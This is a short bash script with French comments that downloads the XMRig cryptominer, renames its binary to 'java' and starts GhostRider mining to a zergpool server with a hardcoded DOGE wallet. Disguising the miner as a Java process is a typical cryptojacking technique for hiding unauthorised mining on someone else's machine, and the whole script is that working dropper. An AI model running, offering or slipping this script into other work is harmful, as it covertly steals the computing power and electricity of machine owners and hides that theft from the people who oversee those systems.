#!/bin/bash

# Télécharger XMRig
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz

# Extraire l'archive téléchargée
tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz

# Accéder au dossier extrait
cd xmrig-6.22.2

# Renommer l'exécutable en 'java'
mv xmrig java

# Donner les permissions d'exécution
chmod +x java

# Démarrer le minage avec l'algorithme GhostRider
./java -a gr -o stratum+tcp://ghostrider.na.mine.zergpool.com:5354 -u D6mhi8pdd2ADDZgJGUKi5f4UKbfdhe77Z1 -p c=DOGE,mc=KUS,ID=d2000
